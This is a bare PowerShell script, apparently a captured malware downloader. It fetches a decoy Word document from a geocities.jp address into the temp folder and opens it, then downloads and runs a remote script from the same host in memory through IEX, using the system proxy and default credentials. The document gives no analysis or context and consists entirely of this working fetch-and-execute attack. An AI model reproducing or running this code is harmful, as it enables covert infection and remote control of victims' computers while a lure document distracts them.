
$n=new-object net.webclient;
$n.proxy=[Net.WebRequest]::GetSystemWebProxy();
$n.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;
$n.DownloadFile("http://www.geocities.jp/lgxpoy6/huuliin-tusul-offsh-20160918.docx","$env:temp\huuliin-tusul-offsh-20160918.docx");
Start-Process "$env:temp\huuliin-tusul-offsh-20160918.docx"
IEX $n.downloadstring('http://www.geocities.jp/lgxpoy6/f0921.ps1');

